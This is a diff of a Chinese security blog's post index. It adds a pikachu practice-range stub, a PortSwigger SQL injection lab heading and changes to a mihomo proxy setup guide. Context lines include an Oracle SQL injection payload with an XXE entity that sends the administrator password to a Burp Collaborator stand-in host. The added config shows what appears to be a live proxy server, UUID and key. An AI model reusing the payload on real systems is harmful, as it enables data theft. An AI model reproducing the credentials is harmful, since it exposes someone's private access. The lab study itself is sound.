@@ -353,6 +353,14 @@ $$</p>
       </categories>
   </entry>
   <entry>
+    <title>【pikachu靶场】docker搭建pikachu靶场</title>
+    <url>/posts/712580ba/</url>
+    <content><![CDATA[<p>pikachu靶场的搭建其实是比较简单的，但是我在使用docker搭建pikachu靶场的时候遇到了几个问题，使我有了一些感悟，因此特意写篇博客记录一下。</p>
+<p>因为我已经在服务器上搭好了pikachu靶场，所以这里我用CentOS 7在虚拟机再复现一次。</p>
+<p>本文参考：</p>
+]]></content>
+  </entry>
+  <entry>
     <title>【安全工具】sqlmap</title>
     <url>/posts/23b5c41a/</url>
     <content><![CDATA[<h2 id="所有命令">所有命令</h2>
@@ -635,6 +643,10 @@ $$</p>
 <p>跟上边类似的</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">TrackingId<span class="operator">=</span>x<span class="string">&#x27;+UNION+SELECT+EXTRACTVALUE(xmltype(&#x27;</span><span class="operator">&lt;</span><span class="operator">%</span><span class="number">3</span>fxml<span class="operator">+</span>version<span class="operator">%</span><span class="number">3</span>d&quot;1.0&quot;<span class="operator">+</span>encoding<span class="operator">%</span><span class="number">3</span>d&quot;UTF-8&quot;<span class="operator">%</span><span class="number">3</span>f<span class="operator">&gt;</span><span class="operator">&lt;</span><span class="operator">!</span>DOCTYPE<span class="operator">+</span>root<span class="operator">+</span>[<span class="operator">+</span><span class="operator">&lt;</span><span class="operator">!</span>ENTITY<span class="operator">+</span><span class="operator">%</span><span class="number">25</span><span class="operator">+</span>remote<span class="operator">+</span><span class="keyword">SYSTEM</span><span class="operator">+</span>&quot;http%3a//&#x27;||(SELECT+password+FROM+users+WHERE+username%3d&#x27;administrator&#x27;)||&#x27;.BURP-COLLABORATOR-SUBDOMAIN/&quot;<span class="operator">&gt;</span><span class="operator">+</span><span class="operator">%</span><span class="number">25</span>remote<span class="operator">%</span><span class="number">3</span>b]<span class="operator">&gt;</span><span class="string">&#x27;),&#x27;</span><span class="operator">/</span>l<span class="string">&#x27;)+FROM+dual--</span></span><br></pre></td></tr></table></figure>
 <p><img src="/posts/3b7c6011//image-20250320142450030.png" alt="image-20250320142450030"></p>
+<h2 id="SQL-injection-with-filter-bypass-via-XML-encoding">SQL injection with filter bypass via XML encoding</h2>
+<p>XML绕过注入</p>
+<p><img src="/posts/3b7c6011//image-20250320153828228.png" alt="image-20250320153828228"></p>
+<p><img src="/posts/3b7c6011//image-20250320153954704.png" alt="image-20250320153954704"></p>
 <p>本文参考：</p>
 ]]></content>
       <categories>
@@ -671,36 +683,64 @@ $$</p>
 <p>mihomo下载，github地址：<a href="https://github.com/MetaCubeX/mihomo">https://github.com/MetaCubeX/mihomo</a></p>
 </li>
 </ol>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1. 因为没法访问外网，要先下载到本地，再传到服务器。</span><br><span class="line">2. gzip -d mihomo.gz          <span class="comment">#解压缩</span></span><br><span class="line">3. <span class="built_in">mv</span> mihomo /usr/local/bin/mihomo</span><br><span class="line">4. <span class="built_in">sudo</span> <span class="built_in">chmod</span> -x /usr/local/bin/mihomo  <span class="comment">#设置可执行权限</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1. 因为没法访问外网，要先下载到本地，再传到服务器。</span><br><span class="line">2. gzip -d mihomo.gz          <span class="comment">#解压缩</span></span><br><span class="line">3. <span class="built_in">mv</span> mihomo /usr/local/bin/mihomo   <span class="comment">#将 mihomo 移动到 /usr/local/bin/ 目录：</span></span><br><span class="line">4. <span class="built_in">sudo</span> <span class="built_in">chmod</span> +x /usr/local/bin/mihomo  <span class="comment">#设置可执行权限</span></span><br></pre></td></tr></table></figure>
 <p>经过上述步骤以后，要在为mihomo添加配置文件config.yaml和Country.mmdb。Country.mmdb我是在在github上找的。</p>
 <p>2.创建 systemd 配置文件 <code>/etc/systemd/system/mihomo.service</code>，并添加如下内容：</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description=mihomo Daemon, Another Clash Kernel.</span><br><span class="line">After=network.target NetworkManager.service systemd-networkd.service iwd.service</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">Type=simple</span><br><span class="line">LimitNPROC=500</span><br><span class="line">LimitNOFILE=1000000</span><br><span class="line">CapabilityBoundingSet=CAP_NET_ADMIN CAP_NET_RAW CAP_NET_BIND_SERVICE CAP_SYS_TIME CAP_SYS_PTRACE CAP_DAC_READ_SEARCH CAP_DAC_OVERRIDE</span><br><span class="line">AmbientCapabilities=CAP_NET_ADMIN CAP_NET_RAW CAP_NET_BIND_SERVICE CAP_SYS_TIME CAP_SYS_PTRACE CAP_DAC_READ_SEARCH CAP_DAC_OVERRIDE</span><br><span class="line">Restart=always</span><br><span class="line">ExecStartPre=/usr/bin/sleep 1s</span><br><span class="line">ExecStart=/usr/local/bin/mihomo -d /etc/mihomo</span><br><span class="line">ExecReload=/bin/kill -HUP <span class="variable">$MAINPID</span></span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure>
 <ol start="3">
 <li class="lvl-3">
+<p>创建配置文件。mihomo和clash meta用的是相同的内核，因此这个配置文件和我本地Windows系统用的clash meta是一样的。我创建的配置文件在/etc/mihomo/config.yaml。部分细节如下：</p>
+</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[11:42:20 root@rocky95 ~]# <span class="built_in">head</span> -n 20 /etc/mihomo/config.yaml </span><br><span class="line">mixed-port: 7890</span><br><span class="line">allow-lan: <span class="literal">true</span></span><br><span class="line">bind-address: <span class="string">&#x27;*&#x27;</span></span><br><span class="line">mode: rule</span><br><span class="line">log-level: info</span><br><span class="line">external-controller: <span class="string">&#x27;127.0.0.1:9090&#x27;</span></span><br><span class="line">unified-delay: <span class="literal">true</span></span><br><span class="line">tcp-concurrent: <span class="literal">true</span></span><br><span class="line">dns:</span><br><span class="line">    <span class="built_in">enable</span>: <span class="literal">true</span></span><br><span class="line">    ipv6: <span class="literal">false</span></span><br><span class="line">    default-nameserver: [223.5.5.5, 119.29.29.29]</span><br><span class="line">    enhanced-mode: fake-ip</span><br><span class="line">    fake-ip-range: 198.18.0.1/16</span><br><span class="line">    use-hosts: <span class="literal">true</span></span><br><span class="line">    nameserver: [<span class="string">&#x27;https://doh.pub/dns-query&#x27;</span>, <span class="string">&#x27;https://dns.alidns.com/dns-query&#x27;</span>]</span><br><span class="line">    fallback: [<span class="string">&#x27;https://doh.dns.sb/dns-query&#x27;</span>, <span class="string">&#x27;https://dns.cloudflare.com/dns-query&#x27;</span>, <span class="string">&#x27;https://dns.twnic.tw/dns-query&#x27;</span>, <span class="string">&#x27;tls://8.8.4.4:853&#x27;</span>]</span><br><span class="line">    fallback-filter: &#123; geoip: <span class="literal">true</span>, ipcidr: [240.0.0.0/4, 0.0.0.0/32] &#125;</span><br><span class="line">proxies:</span><br><span class="line">    - &#123; name: <span class="string">&#x27;剩余流量：918.16 GB&#x27;</span>, <span class="built_in">type</span>: vless, server: pq.aws48.yydjc.top, port: 443, uuid: 6806220d-2952-4fab-8617-ea56feab45b1, udp: <span class="literal">true</span>, tls: <span class="literal">true</span>, skip-cert-verify: <span class="literal">false</span>, flow: xtls-rprx-vision, client-fingerprint: chrome, servername: buylite.tv.apple.com, reality-opts: &#123; public-key: 6T-kYBf65ERaEAhxIyHL1FCfu0QR6P2XQMtcvUgzSjM, short-id: 70ad150d &#125; &#125;</span><br></pre></td></tr></table></figure>
+<ol start="4">
+<li class="lvl-3">
 <p>重启systemd</p>
 </li>
 </ol>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl daemon-reload</span><br></pre></td></tr></table></figure>
-<ol start="4">
+<ol start="5">
 <li class="lvl-3">
 <p>启用 mihomo 服务：</p>
 </li>
 </ol>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">4. systemctl <span class="built_in">enable</span> mihomo</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl <span class="built_in">enable</span> mihomo</span><br></pre></td></tr></table></figure>
 <h3 id="mihomo使用">mihomo使用</h3>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1. 启用 mihomo 服务：</span><br><span class="line">systemctl <span class="built_in">enable</span> mihomo</span><br><span class="line">2. 立即启动 mihomo:</span><br><span class="line">systemctl start mihomo</span><br><span class="line">3. 重新加载mihomo</span><br><span class="line">systemctl reload mihomo</span><br><span class="line">4. 检查 mihomo 的运行状况</span><br><span class="line">systemctl status mihomo</span><br><span class="line">5. 检查 mihomo 的运行日志</span><br><span class="line">journalctl -u mihomo -o <span class="built_in">cat</span> -e</span><br><span class="line">或</span><br><span class="line">journalctl -u mihomo -o <span class="built_in">cat</span> -f</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1. 启用 mihomo 服务：</span><br><span class="line">systemctl <span class="built_in">enable</span> mihomo</span><br><span class="line">2. 立即启动 mihomo:</span><br><span class="line">systemctl start mihomo</span><br><span class="line">3. 重新加载mihomo</span><br><span class="line">systemctl reload mihomo</span><br><span class="line">4. 检查 mihomo 的运行状况</span><br><span class="line">systemctl status mihomo</span><br><span class="line">5. 检查 mihomo 的运行日志</span><br><span class="line">journalctl -u mihomo -o <span class="built_in">cat</span> -e</span><br><span class="line">或</span><br><span class="line">journalctl -u mihomo -o <span class="built_in">cat</span> -f</span><br><span class="line">6. 关闭 mihomo 服务：</span><br><span class="line">systemctl <span class="built_in">disable</span> mihomo</span><br></pre></td></tr></table></figure>
 <h2 id="为Linux设置代理">为Linux设置代理</h2>
 <h3 id="临时启用和关闭代理">临时启用和关闭代理</h3>
 <p>在使用Linux时，临时启用代理的命令：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> http_proxy=http://ip:port</span><br><span class="line"><span class="built_in">export</span> https_proxy=htpp://ip:port</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> http_proxy=http://ip:port</span><br><span class="line"><span class="built_in">export</span> https_proxy=http://ip:port</span><br></pre></td></tr></table></figure>
 <p>ip和port为你的代理服务器的ip以及开放的端口。</p>
 <p>取消代理：</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">unset</span> http_proxy</span><br><span class="line"><span class="built_in">unset</span> https_proxy</span><br></pre></td></tr></table></figure>
 <h3 id="永久全局代理">永久全局代理</h3>
 <p>永久全局代理将临时启用代理的命令添加至系统配置文件中，source刷新shell环境即可。</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/profile</span><br><span class="line">……</span><br><span class="line"><span class="built_in">export</span> http_proxy=http://j262.kdltps.com:15818</span><br><span class="line"><span class="built_in">export</span> https_proxy=https://j262.kdltps.com:15818</span><br><span class="line">……</span><br><span class="line"><span class="built_in">source</span> /etc/profile</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/profile</span><br><span class="line">……</span><br><span class="line"><span class="built_in">export</span> http_proxy=http://ip:port</span><br><span class="line"><span class="built_in">export</span> https_proxy=https://ip:port</span><br><span class="line">……</span><br><span class="line"><span class="built_in">source</span> /etc/profile</span><br></pre></td></tr></table></figure>
 <h3 id="设置代理的基本语法">设置代理的基本语法</h3>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">`环境变量</span><br><span class="line">http_proxy:为http变量设置代理;默认不填开头以http协议传输</span><br><span class="line"><span class="comment"># 示例</span></span><br><span class="line">`以下是常见的基本语法</span><br><span class="line">http_proxy=ip:prot</span><br><span class="line">http_proxy=http://ip:prot</span><br><span class="line">http_proxy=socks4://ip:prot</span><br><span class="line">http_proxy=socks5://ip:prot</span><br><span class="line">​</span><br><span class="line">`如果不想设置白名单,也可以使用用户名和密码进行验证</span><br><span class="line">http_proxy=http://username:password@ip:prot</span><br><span class="line">http_proxy=http://username:password@ip:prot</span><br><span class="line">​</span><br><span class="line">https_proxy:为https设置代理</span><br><span class="line">ftp_proxy:为ftp设置代理</span><br><span class="line">all_proxy:全部变量设置代理,设置了这个的时候上面不需要设置</span><br><span class="line">no_proxy:无需代理的主机或域名;可以使用通配符,多个时使用<span class="string">&quot;,&quot;</span>号分隔</span><br><span class="line"><span class="comment"># 示例：</span></span><br><span class="line">*.aiezu.com,10.*.*.*,192.168.*.*</span><br><span class="line">*.<span class="built_in">local</span>,localhost,127.0.0.1</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">`环境变量</span><br><span class="line">http_proxy:为http变量设置代理;默认不填开头以http协议传输</span><br><span class="line"><span class="comment"># 示例</span></span><br><span class="line">`以下是常见的基本语法</span><br><span class="line">http_proxy=ip:port</span><br><span class="line">http_proxy=http://ip:port</span><br><span class="line">http_proxy=socks4://ip:port</span><br><span class="line">http_proxy=socks5://ip:port</span><br><span class="line">​</span><br><span class="line">`如果不想设置白名单,也可以使用用户名和密码进行验证</span><br><span class="line">http_proxy=http://username:password@ip:port</span><br><span class="line">http_proxy=http://username:password@ip:port</span><br><span class="line">​</span><br><span class="line">https_proxy:为https设置代理</span><br><span class="line">ftp_proxy:为ftp设置代理</span><br><span class="line">all_proxy:全部变量设置代理,设置了这个的时候上面不需要设置</span><br><span class="line">no_proxy:无需代理的主机或域名;可以使用通配符,多个时使用<span class="string">&quot;,&quot;</span>号分隔</span><br><span class="line"><span class="comment"># 示例：</span></span><br><span class="line">*.aiezu.com,10.*.*.*,192.168.*.*</span><br><span class="line">*.<span class="built_in">local</span>,localhost,127.0.0.1</span><br></pre></td></tr></table></figure>
+<h3 id="部署Web控制面板">部署Web控制面板</h3>
+<p>部署好了mihomo代理以后，在虚拟机上切换节点、重载配置等较为不便，可以为mihomo部署控制面板，方便管理。但如果服务器暴露在公网中，使用Web面板会很不安全。因此我只在需要调试的时候会把Web面板打开。部署控制面板的操作如下：</p>
+<ol>
+<li class="lvl-3">
+<p>在config.yaml中添加或修改如下配置：</p>
+</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">external-controller: <span class="string">&#x27;0.0.0.0:7891&#x27;</span></span><br><span class="line">external-ui: /etc/mihomo/ui</span><br></pre></td></tr></table></figure>
+<ol start="2">
+<li class="lvl-3">
+<p>从github下载</p>
+</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> git <span class="built_in">clone</span> https://github.com/metacubex/metacubexd.git -b gh-pages /etc/mihomo/ui</span><br></pre></td></tr></table></figure>
+<ol start="3">
+<li class="lvl-3">
+<p>重启mihomo服务</p>
+</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> systemctl restart mihomo</span><br></pre></td></tr></table></figure>
+<p>本地访问<a href="http://ip">http://ip</a>:port/ui就可以访问Web面板了</p>
+<p><font class="notice">注意：虽然查看该面板需要密码，但是密码随机输入即可，并不具备安全性</font></p>
 <h2 id="docker使用网络代理">docker使用网络代理</h2>
 <p>gitbook上有一篇docker的详解：<a href="https://yeasy.gitbook.io/docker_practice/">Docker — 从入门到实践</a></p>
 <ul class="lvl-0">
@@ -721,6 +761,9 @@ $$</p>
 </li>
 </ul>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> systemctl daemon-reload</span><br><span class="line"><span class="built_in">sudo</span> systemctl restart docker</span><br></pre></td></tr></table></figure>
+<h2 id="客户端使用代理">客户端使用代理</h2>
+<p>因为代理是部署在服务器的，因此自己的手机、电脑、平板等也可以使用服务器的代理。但是要修改配置文件allow-lan改为true。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">allow-lan: <span class="literal">true</span></span><br></pre></td></tr></table></figure>
 <h2 id="遇到的问题：">遇到的问题：</h2>
 <ol>
 <li class="lvl-3">
